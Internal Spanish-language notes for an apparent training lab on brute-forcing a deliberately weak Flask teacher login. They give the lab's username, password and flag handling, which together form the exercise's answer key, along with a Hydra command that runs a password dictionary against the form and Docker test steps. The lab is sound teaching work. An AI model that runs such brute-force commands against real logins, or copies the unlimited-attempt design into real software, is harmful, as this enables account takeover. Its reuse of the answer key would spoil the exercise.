# Laboratorio 1 — Fuerza bruta (Instituto TecnoSur, Portal Campus)

Notas internas del equipo. No se sube a la imagen ni se muestra al alumno.

## Resumen
- Página: login de profesores en `/login` (Flask).
- Vulnerabilidad: sin límite de intentos (sin bloqueo, sin CAPTCHA, sin demora) +
  contraseña débil.
- Usuario: `camila.rios`
- Contraseña: `123456789`
- Flag: la escribe el broker en `/root/flag.txt` al crear el contenedor (no está
  en la imagen). El panel (`/panel`, tras login correcto) la lee y la muestra.

## Comando de referencia para probar con Hydra
```
hydra -l camila.rios -P /usr/share/wordlists/rockyou.txt <IP> \
  http-post-form "/login:usuario=^USER^&clave=^PASS^:incorrectos" -s 80 -t 4
```
`123456789` está entre las primeras líneas de `rockyou.txt` (viene ordenado por
frecuencia), así que se encuentra rápido incluso con el diccionario completo.

## Build y prueba local (Kali)
```bash
docker build -t sparring/fuerza-bruta:1.0 .
docker run -d --name prueba-lab1 -p 8081:80 sparring/fuerza-bruta:1.0
docker exec prueba-lab1 sh -c 'echo "SH{prueba0000000000000000000000}" > /root/flag.txt && chmod 400 /root/flag.txt'
# abrir http://<ip-kali>:8081/
docker rm -f prueba-lab1
```
El `docker exec` solo simula lo que hace el broker en producción (`put_archive`
antes de `start`); en el broker real la flag nunca se escribe así.

## Pendiente
- Pulir mensajes de error / accesibilidad del formulario.
- Decidir si se agrega un segundo campo señuelo (usuario de alumno) para que
  el alumno tenga que descubrir cuál es la cuenta correcta, o se deja así
  de simple para el primer escalón (recomendado: dejarlo simple).
